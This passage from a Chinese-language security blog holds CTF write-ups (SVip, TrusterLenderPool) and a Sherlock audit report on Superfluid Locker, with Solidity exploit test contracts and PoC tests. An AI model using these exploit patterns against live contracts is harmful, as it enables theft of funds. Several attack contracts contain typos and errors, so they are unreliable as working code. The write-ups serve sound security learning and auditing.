&#125;</span><br><span class="line"></span><br><span class="line">    // 获取a，b两个值的大值</span><br><span class="line">    function min(uint a,uint b) public view returns(uint)&#123;</span><br><span class="line">        return a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 取钱：需要通过merkle树验证，可以发给任何地址，一次最多取1wei</span><br><span class="line">    function withdraw(bytes32[] memory proof,address to) public returns(bool)&#123;</span><br><span class="line">        bytes32 leaf = keccak256(abi.encodePacked(msg.sender));</span><br><span class="line">        require(MerkleProof.verify(proof, merkleRoot, leaf), &quot;Merkle Proof Verification failed&quot;);</span><br><span class="line">        uint balance = address(this).balance;</span><br><span class="line">        // 这里的amount没啥用，因为balnace一定是大于amount的，将本合约中的所有钱给到to地址</span><br><span class="line">        payable(to).transfer(min(amount,balance));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf() public view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setMerkleroot(bytes32 _merkleroot) external onlyOwner &#123; </span><br><span class="line">        merkleRoot = _merkleroot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 任务是将合约中的余额归零</span><br><span class="line">    function Complete() external &#123;</span><br><span class="line">        require(address(this).balance == 0);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求让合约的余额变为零</p><blockquote><p>这里先扩展一下，&amp;，|，^,~,的操作，都是比较二进制<br>&amp;：俩个数相同为1，不同为0<br>|:俩个数只少有一个为1，就为1.<br>^:俩个不同就为1，俩个相同就为0.<br>~：全部变为相反的数字</p></blockquote><p>这个题的思路就很简单，就是要将自己成为白名单上的，然后就可以更改root，调用withdraw函数，撤回所有的资金，然后用create2来创建合约地址就可以了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SVip</title>
      <link href="/2024/11/30/CTF-SVip/"/>
      <url>/2024/11/30/CTF-SVip/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SVip"><a href="#CTF-SVip" class="headerlink" title="CTF-SVip"></a>CTF-SVip</h1><p>首先先看题目代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// pragma solidity 0.4.24; //这是原来的版本，很奇怪不知道为啥无法在foundry编译，所以换成以下版本</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract SVip &#123;</span><br><span class="line">    // 一个地址记录一个分数</span><br><span class="line">    mapping(address =&gt; uint) public points;</span><br><span class="line">    // 查看某地址是不是超级VIP</span><br><span class="line">    mapping(address =&gt; bool) public isSuperVip;</span><br><span class="line">    uint256 public numOfFree;</span><br><span class="line"></span><br><span class="line">    // 用户成为超级VIP需要999分数</span><br><span class="line">    function promotionSVip() public &#123;</span><br><span class="line">        require(points[msg.sender] &gt;= 999, &quot;Sorry, you don&#x27;t have enough points&quot;);</span><br><span class="line">        isSuperVip[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 领取免费分数，所有人领取的分数加起来不得等于100</span><br><span class="line">    function getPoint() public&#123;</span><br><span class="line">        require(numOfFree &lt; 100);</span><br><span class="line">        points[msg.sender] += 1;</span><br><span class="line">        numOfFree++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 送分，明显是存在发给自己这种漏洞情况</span><br><span class="line">    function transferPoints(address to, uint256 amount) public &#123;</span><br><span class="line">        uint256 tempSender = points[msg.sender];</span><br><span class="line">        uint256 tempTo = points[to];</span><br><span class="line">        require(tempSender &gt; amount);</span><br><span class="line">        require(tempTo + amount &gt; amount);</span><br><span class="line">        points[msg.sender] = tempSender - amount;</span><br><span class="line">        points[to] = tempTo + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 任务是成为超级VIP</span><br><span class="line">    function isComplete() public view  returns(bool) &#123;</span><br><span class="line">        require(isSuperVip[msg.sender]);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然免费领取的分数有100的上限，但是有个途径可以让我们有增加分数的机会，就是在transferPoints函数中，就存在一个自我的转账的机会，让自己的分数增加，（由于我克隆的仓库出现了网络的问题，所以不能 实现一个复现了）</p><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragam solidity^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;</span><br><span class="line">import &quot;src/SVip.sol&quot;</span><br><span class="line"></span><br><span class="line">contract hack is test&#123;</span><br><span class="line">    SVip svip;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        svip = new SVip();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_SVip() public &#123;</span><br><span class="line">        //首先领取分数</span><br><span class="line">        for (int i = 0; i&lt;20;i++)</span><br><span class="line">        svip.getPoint();</span><br><span class="line"></span><br><span class="line">        //通过自我转账来实现分数的999,因为转账一次翻俩倍</span><br><span class="line">        //20-&gt;40-&gt;80-&gt;160-&gt;320-&gt;640-&gt;1280</span><br><span class="line">        for(int i = 0; i&lt; 6;i++ )</span><br><span class="line">        svip.tranferPoint(address(this),points(address(this)));</span><br><span class="line"></span><br><span class="line">        svip.promotionSVip();</span><br><span class="line">        assert(svip.isComplete(),ture);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的可以解决了</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-TrusterLenderPool</title>
      <link href="/2024/11/30/CTF-TrusterLenderPool/"/>
      <url>/2024/11/30/CTF-TrusterLenderPool/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-TrusterLenderPool"><a href="#CTF-TrusterLenderPool" class="headerlink" title="CTF-TrusterLenderPool"></a>CTF-TrusterLenderPool</h1><p>这个题很经典。又是假装还款的存在</p><p>有用到swap交换，而且还是address(this)来检查token0的地址，所以就更加可以用来假装还款了</p><p>题目源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Cert is IERC20 &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 预挖给msg.sender 1000个代币</span><br><span class="line">    constructor () &#123;</span><br><span class="line">        _mint(msg.sender, 10000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 特定地址和admin啥也不做，否则</span><br><span class="line">    modifier safeCheek(address spender, uint256 amount) &#123;</span><br><span class="line">        if (uint160(tx.origin) &amp; 0xffffff != 0xbeddC4 || tx.origin == admin) &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            grant(spender, amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将第amount个slot的值设置为tx.origin</span><br><span class="line">    function grant(address spender, uint256 amount) internal &#123;</span><br><span class="line">        // spender必须是一个合约，并且代码长度得小于10，长度限制挺苛刻的</span><br><span class="line">        require(spender.code.length &gt; 0 &amp;&amp; spender.code.length &lt; 10);</span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        bytes32 slot = bytes32(amount);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view returns (uint256) &#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public safeCheek(spender,amount) returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) public returns (bool) &#123;</span><br><span class="line">        _spendAllowance(from, msg.sender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer( address from, address to, uint256 amount) internal &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">        _balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line">        _totalSupply += amount;</span><br><span class="line">        _balances[account] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve( address owner, address spender,  uint256 amount) internal &#123;</span><br><span class="line">        if(tx.origin==admin)&#123;</span><br><span class="line">            require(msg.sender.code.length&gt;0);</span><br><span class="line">            _allowances[spender][tx.origin] = amount;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance( address owner, address spender, uint256 amount) internal &#123;</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract TrusterLenderPool is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable token0;</span><br><span class="line">    IERC20 public immutable token1;</span><br><span class="line"></span><br><span class="line">    // 创建了两个Cert，然后赋值给token0和token1，本合约拥有token0和token1各10000个</span><br><span class="line">    constructor () &#123;</span><br><span class="line">        token0 = new Cert();</span><br><span class="line">        token1 = new Cert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 交换token0和token1，使用之前需要先授权给本合约，这里是等额交换，也就是加减法交换</span><br><span class="line">    function swap(address tokenAddress, uint amount) public returns(uint)&#123;</span><br><span class="line">        require(</span><br><span class="line">            // 以 || 为界限，必须上边都为true或下边都为true</span><br><span class="line">            tokenAddress == address(token0) &amp;&amp; token1.transferFrom(msg.sender,address(this),amount)  &amp;&amp; token0.transfer(msg.sender,amount) </span><br><span class="line">            </span><br><span class="line">            ||</span><br><span class="line"></span><br><span class="line">            tokenAddress== address(token1) &amp;&amp; token0.transferFrom(msg.sender,address(this),amount) &amp;&amp; token1.transfer(msg.sender,amount));</span><br><span class="line">        return amount;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // 闪电贷</span><br><span class="line">    function flashLoan(uint256 borrowAmount,address borrower) external nonReentrant&#123;</span><br><span class="line">        // 获取闪电贷之前token0的余额</span><br><span class="line">        uint256 balanceBefore = token0.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line">        </span><br><span class="line">        // 借给borrower，可以是任意地址</span><br><span class="line">        token0.transfer(borrower, borrowAmount);</span><br><span class="line">        // 回调borrower的receiveEther(uint256)进行还钱</span><br><span class="line">        borrower.functionCall(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveEther(uint256)&quot;,</span><br><span class="line">                borrowAmount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 检查token0余额，必须大于等于之前的余额</span><br><span class="line">        uint256 balanceAfter = token0.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 本关目标：将token0余额设置为0</span><br><span class="line">    function Complete() external &#123;</span><br><span class="line">        require(token0.balanceOf(address(this)) == 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和之前的一个整理的例子很想，都是讲token变为零</p><p> 那么测试合约<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragam solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;</span><br><span class="line">import &quot;src/TrusterLenderPool.sol&quot;</span><br><span class="line"></span><br><span class="line">contract attack is Test&#123;</span><br><span class="line">  </span><br><span class="line">  TrusterLenderPool pool;</span><br><span class="line">  Cert token0;</span><br><span class="line">  Cert token1;</span><br><span class="line"></span><br><span class="line">  function setUp() public &#123;</span><br><span class="line">   pool = new TrusterLenderPool;</span><br><span class="line">   token0 = Cert(address(pool.token0()));</span><br><span class="line">   token2 = Cert(address(pool.token1()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function test_TrusterLenderPool() public&#123;</span><br><span class="line">   pool.flashLoan(10000,address(this));</span><br><span class="line">   token1.approve(pool,10000);</span><br><span class="line">   pool.swap(token0,10000);</span><br><span class="line"></span><br><span class="line">   assertEq(balanceOf(pool.token0()),0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fouction receiveEther(uint256 amount) external&#123;</span><br><span class="line">   token0.approve(pool,10000);</span><br><span class="line">   pool.swap(token1,10000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-Superfluid Locker System 审计报告</title>
      <link href="/2024/11/25/sherlock-Superfluid-Locker-System-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/11/25/sherlock-Superfluid-Locker-System-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Due to the lack of access control on the stopFunding function, anyone can monitor the blockchain, identify a program with an active funding process, and maliciously call the stopFunding function to stop the program, resulting in improper fund allocation.<br>I know you have already described it<br><a href="https://github.com/sherlock-audit/2024-11-superfluid-locking-contract-HeYuan-33?tab=readme-ov-file#q-please-discuss-any-design-choices-you-made">https://github.com/sherlock-audit/2024-11-superfluid-locking-contract-HeYuan-33?tab=readme-ov-file#q-please-discuss-any-design-choices-you-made</a><br>But can you be sure that the participant is not an attacker?</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-superfluid-locking-contract-HeYuan-33&#x2F;fluid&#x2F;packages&#x2F;contracts&#x2F;src&#x2F;FluidEPProgramManager.sol</p><p>Line 294 in e0d5af5</p><p> function stopFunding(uint256 programId) external { </p><p>As we can see, the stopFunding function is only marked as external, meaning it can be called externally. This allows an attacker to freely stop a program, leading to improper fund allocation.<br>Internal pre-conditions<br>No response</p><h2 id="External-pre-conditions"><a href="#External-pre-conditions" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>The program ID is obtained by the attacker, and it is an actively running program.</p><h2 id="Attack-Path"><a href="#Attack-Path" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>The attacker obtains an actively running program ID through blockchain monitoring.<br>The attacker calls the stopFunding function, causing the program to be forcibly stopped.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>An actively running program can be prematurely terminated.<br>Maliciously trigger related fund distribution and compensation operations.<br>If an attacker calls stopFunding, it will delete the program’s information, and it cannot be recovered permanently.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a check to verify if the caller is a participant in the project, to prevent non-participants from calling the function.No matter what, adding a check for the caller is never a mistake.</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>这次的审计报告提交的很少，基本没有什么漏洞，这次主要是去看了合约的逻辑实现，其实一些精度计算，四舍五入的那些地方没有去仔细看，就忽略了这个漏洞，虽然这次提交又是被判为无效，但是也是知道了首先阅读审计开始前的要求，还有就是对于那些权限很松的注意一下抢跑攻击，比如这次的claim函数，就是和pool建立联系，但是攻击者也可以提前知道用户的交易，然后抢先去提交交易，让用户建立不了链接，以下是正确的报告。还是的学习怎么写poc测试。</p><h2 id="抢跑攻击"><a href="#抢跑攻击" class="headerlink" title="抢跑攻击"></a>抢跑攻击</h2><p>FluidLocker can be blocked from connecting to a pool</p><h3 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h3><p>For FluidLockers to get money streamed into them they need to be connected to the distribution pools. This connection is established in claim function. However an attacker can observe locker transactions and call FluidEPProgramManager::UpdateUserUnits before user transactions go through. This will mark the signatures as used and update FluidLocker units without connecting the locker to the distribution pool.</p><h3 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>FluidLocker’s claim function updates locker units, verifies signatures and also establishes the connection between the locker and pool. <a href="https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/1fa5f86024be5f269e1a0898b1f939f1d4cce149/fluid/packages/contracts/src/FluidLocker.sol#L155C1-L171C6">https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/1fa5f86024be5f269e1a0898b1f939f1d4cce149/fluid/packages/contracts/src/FluidLocker.sol#L155C1-L171C6</a>.<br>This connection will enable lockers to reflect their token balances on the event of a distribution, otherwise some address or the locker needs to manually claim for the locker.<br>However an attacker can observe user’s claim and call FluidEPProgramManager::UpdateUserUnits before user transactions go through. This will mark the signatures as used and update FluidLocker units without connecting the locker to the distribution pool.<br><a href="https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/1fa5f86024be5f269e1a0898b1f939f1d4cce149/fluid/packages/contracts/src/EPProgramManager.sol#L119C1-L149C6">https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/1fa5f86024be5f269e1a0898b1f939f1d4cce149/fluid/packages/contracts/src/EPProgramManager.sol#L119C1-L149C6</a> (Note that the _poolUpdate of this function is overridden by FluidEPProgramManager’s _poolUpdate).</p><h3 id="Internal-pre-conditions"><a href="#Internal-pre-conditions" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h3><p>No response</p><h3 id="External-pre-conditions-1"><a href="#External-pre-conditions-1" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h3><p>No response</p><h3 id="Attack-Path-1"><a href="#Attack-Path-1" class="headerlink" title="Attack Path"></a>Attack Path</h3><p>User calls claim<br>Attacker front runs the call with FluidEPProgramManager::UpdateUserUnits with same parameters</p><h3 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h3><p>Although users can claim for the locker at any point, this is out of the ordinary flow and will be unexpected for the users, thus can lead to denial of funds for some time.</p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>No response</p><h3 id="Mitigation-1"><a href="#Mitigation-1" class="headerlink" title="Mitigation"></a>Mitigation</h3><p>Locker’s connection to the pool should be seperated from claims.</p><h2 id="四舍五入的问题，先除后乘，会导致精度损失"><a href="#四舍五入的问题，先除后乘，会导致精度损失" class="headerlink" title="四舍五入的问题，先除后乘，会导致精度损失"></a>四舍五入的问题，先除后乘，会导致精度损失</h2><p>When calculating in the _getUnlockingPercentage function, 540 was mistakenly used instead of 540 days for calculation. As a result, users can unlock all their funds earlier without paying penalties.</p><h3 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h3><p>When calculating in the _getUnlockingPercentage function, 540 was mistakenly used instead of 540 days for calculation. As a result, users can unlock all their funds earlier without paying penalties.</p><h3 id="Root-Cause-2"><a href="#Root-Cause-2" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>In FluidLocker.sol#L388, 540 was mistakenly used instead of 540 days for calculation.<br>In FluidLocker.sol#L379-L381, since the minimum return of _getUnlockingPercentage is 269731 even if it is unlocked using the minimum unlocking period of 7 days(It is assumed that the accuracy problem in the calculation has been fixed.). This is greater than 10000. so it will result in an overflow of L381. This means that the user can’t use the vest form of unlocking. This forces the user to use _instantUnlock and pay an 80% penalty.</p><h3 id="Internal-pre-conditions-1"><a href="#Internal-pre-conditions-1" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h3><p>No response</p><h3 id="External-pre-conditions-2"><a href="#External-pre-conditions-2" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h3><p>No response</p><h3 id="Attack-Path-2"><a href="#Attack-Path-2" class="headerlink" title="Attack Path"></a>Attack Path</h3><p>No response</p><h3 id="Impact-2"><a href="#Impact-2" class="headerlink" title="Impact"></a>Impact</h3><p>Users have to pay an 80% penalty to unlock it. This has resulted in user losses.</p><h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3><p>For simplicity, I directly changed the _getUnlockingPercentage function to public and fixed the error due to precision issues first. The code is as follows:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _getUnlockingPercentage(uint128 unlockPeriod) public pure returns (uint256 unlockingPercentageBP) &#123;  </span><br><span class="line">    unlockingPercentageBP = (  </span><br><span class="line">        _PERCENT_TO_BP  </span><br><span class="line">            * (  </span><br><span class="line">                // ((80 * _SCALER) / Math.sqrt(540 * _SCALER)) * (Math.sqrt(unlockPeriod * _SCALER) / _SCALER)  </span><br><span class="line">                (80 * _SCALER) * (Math.sqrt(unlockPeriod * _SCALER)) / Math.sqrt(540 * _SCALER)  </span><br><span class="line">                    + 20 * _SCALER  </span><br><span class="line">            )  </span><br><span class="line">    ) / _SCALER;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="poc-put-in-FluidLocker-t-sol"><a href="#poc-put-in-FluidLocker-t-sol" class="headerlink" title="poc(put in FluidLocker.t.sol):"></a>poc(put in FluidLocker.t.sol):</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function test_getUnlockingPercentage() external virtual &#123;  </span><br><span class="line">    FluidLocker(address(aliceLocker))._getUnlockingPercentage(7 days);  </span><br><span class="line">    FluidLocker(address(aliceLocker))._getUnlockingPercentage(540 days);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="Resault"><a href="#Resault" class="headerlink" title="Resault:"></a>Resault:</h3><p>[PASS] test_getUnlockingPercentage() (gas: 22807)<br>Traces:<br>  [22807] FluidLockerTest::test_getUnlockingPercentage()<br>    ├─ [13073] BeaconProxy::_getUnlockingPercentage(604800 [6.048e5]) [staticcall]<br>    │   ├─ [2308] UpgradeableBeacon::implementation() [staticcall]<br>    │   │   └─ ← [Return] FluidLocker: [0x426eeFE8AF33482cA9F3ED139b1991984468926E]<br>    │   ├─ [2974] FluidLocker::_getUnlockingPercentage(604800 [6.048e5]) [delegatecall]<br>    │   │   └─ ← [Return] 269731 [2.697e5]<br>    │   └─ ← [Return] 269731 [2.697e5]<br>    ├─ [4055] BeaconProxy::_getUnlockingPercentage(46656000 [4.665e7]) [staticcall]<br>    │   ├─ [308] UpgradeableBeacon::implementation() [staticcall]<br>    │   │   └─ ← [Return] FluidLocker: [0x426eeFE8AF33482cA9F3ED139b1991984468926E]<br>    │   ├─ [2956] FluidLocker::_getUnlockingPercentage(46656000 [4.665e7]) [delegatecall]<br>    │   │   └─ ← [Return] 2353510 [2.353e6]<br>    │   └─ ← [Return] 2353510 [2.353e6]<br>    └─ ← [Stop]  </p><h3 id="Mitigation-2"><a href="#Mitigation-2" class="headerlink" title="Mitigation"></a>Mitigation</h3><pre><code>    unlockingPercentageBP = (          _PERCENT_TO_BP              * (  </code></pre><ul><li><pre><code>               ((80 * _SCALER) / Math.sqrt(540 * _SCALER)) * (Math.sqrt(unlockPeriod * _SCALER) / _SCALER)</code></pre></li></ul><ul><li><pre><code>               (80 * _SCALER) * (Math.sqrt(unlockPeriod * _SCALER)) / Math.sqrt(540 days * _SCALER)                    + 20 * _SCALER            )    ) / _SCALER;</code></pre></li></ul><h3 id="计算错误，导致固定的比例，这篇报告真的受膜拜"><a href="#计算错误，导致固定的比例，这篇报告真的受膜拜" class="headerlink" title="计算错误，导致固定的比例，这篇报告真的受膜拜"></a>计算错误，导致固定的比例，这篇报告真的受膜拜</h3><p>Invalid vest unlock flow rate calculations in FluidLocker::_vestUnlock(…) leads to recepients paying much higher tax rates than intended</p><h3 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h3><p>The FluidLocker contract allows users to lock FLUID tokens, and then at specific unlockPeriods to unlock them. When unlocking, users can choose to do it either instantly, and pay an 80% tax fee to stakers, or use a vesting scheme, where funds are flown to the user, using a Fontaine, based on the unlock period chosen. However, with the current logic in FluidLocker::_vestUnlock(…), there is no difference if a recipient unlocks with unlockPeriod &#x3D; 0 or unlockPeriod &#x3D; 540 days as there will be a constant 80% tax.</p><h3 id="Root-Cause-3"><a href="#Root-Cause-3" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>In FluidLocker::_getUnlockingPercentage(…) invalid calculations are being carried out, leading to the function always producing a result of 2000, no matter what unlockPeriod is given. Because of this, the resulting unlockFlowRate will always be capped at 20% meaning that recipients who unlock at the max period will pay a constant tax of 80% to stakers, as if they unlocked at the very beginning.</p><h3 id="Internal-pre-conditions-2"><a href="#Internal-pre-conditions-2" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h3><p>N&#x2F;A</p><h3 id="External-pre-conditions-3"><a href="#External-pre-conditions-3" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h3><p>N&#x2F;A</p><h3 id="Attack-Path-3"><a href="#Attack-Path-3" class="headerlink" title="Attack Path"></a>Attack Path</h3><p>Locker A’s owner unlocks tokens for Alice with an unlock period of 0.<br>Alice pays 80% tax rate to instantly receive her tokens.<br>Locker A’s owner unlocks tokens for Bob with an unlockPeriod of 540 days.<br>Bob should pay 0 % tax, however due to improper calculations, he ends up paying 80% tax as well.,<br>Impact<br>FluidLocker::unlock(…) recipients who choose to unlock using the vesting option pay higher taxes than intended, thus receiving fewer tokens than what they should be.</p><h3 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h3><p>The following test can be added in FluidLocker.t.sol and ran with forge test –mt test_getUnlockingPercentage -vv</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private constant _SCALER = 1e18;  </span><br><span class="line">  </span><br><span class="line">uint256 private constant _PERCENT_TO_BP = 100;  </span><br><span class="line">  </span><br><span class="line">function _getUnlockingPercentage(uint128 unlockPeriod) internal pure returns (uint256 unlockingPercentageBP) &#123;  </span><br><span class="line">    unlockingPercentageBP = (  </span><br><span class="line">        _PERCENT_TO_BP  </span><br><span class="line">            * (  </span><br><span class="line">                ((80 * _SCALER) / Math.sqrt(540 * _SCALER)) * (Math.sqrt(unlockPeriod * _SCALER) / _SCALER)  </span><br><span class="line">                    + 20 * _SCALER  </span><br><span class="line">            )  </span><br><span class="line">    ) / _SCALER;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">// Add this test function to your FluidLockerTest contract  </span><br><span class="line">function test_getUnlockingPercentage() public &#123;  </span><br><span class="line">    // Create a helper function to access the internal function  </span><br><span class="line">  </span><br><span class="line">    // Test different periods  </span><br><span class="line">    uint128 sevenDays = 7 days;  </span><br><span class="line">    uint128 thirtyDays = 30 days;  </span><br><span class="line">    uint128 ninetyDays = 90 days;  </span><br><span 